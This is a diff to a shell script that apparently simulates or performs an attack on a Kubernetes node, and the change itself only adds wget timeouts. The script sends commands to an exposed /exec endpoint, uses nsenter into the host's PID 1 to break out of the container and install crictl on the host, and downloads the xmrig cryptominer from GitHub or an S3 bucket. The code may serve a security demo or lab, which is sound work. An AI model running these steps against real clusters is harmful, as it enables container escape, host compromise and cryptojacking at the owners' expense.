@@ -47,7 +47,7 @@ echo "--------------------------------------------------------------------------
 ARCH=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
 echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz\""
 echo "---"
-curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz"
+curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget --timeout=5 -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz"
 echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin\""
 echo "---"
 curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin"
@@ -108,11 +108,11 @@ echo "--------------------------------------------------------------------------
 if [[ "$ARCH" == "amd64" ]]; then
     echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz\""
     echo "---"
-    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"
+    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget --timeout=5 https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"
 else
     echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz\""
     echo "---"
-    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"
+    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget --timeout=5 https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"
 fi
 echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'"
 echo "---"
